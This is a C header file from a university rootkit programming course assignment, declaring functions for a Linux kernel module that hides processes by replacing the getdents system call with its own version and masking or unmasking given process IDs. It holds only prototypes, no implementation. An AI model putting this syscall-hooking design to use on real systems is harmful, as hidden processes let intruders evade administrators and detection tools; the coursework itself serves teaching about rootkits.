
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: process_masking.h                                               */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage: Header file for module `process_masking.c`                         */
/*                                                                             */
/*******************************************************************************/

#ifndef __PROCESS_MASKING__
#define __PROCESS_MASKING__


/* Declaration of functions */
static int process_masking_init(int);
static int process_masking_exit();

asmlinkage int my_getdents_syscall(unsigned int, struct linux_dirent *, unsigned int);

static void mask_process(pid_t);
static void unmask_process(pid_t);

#endif
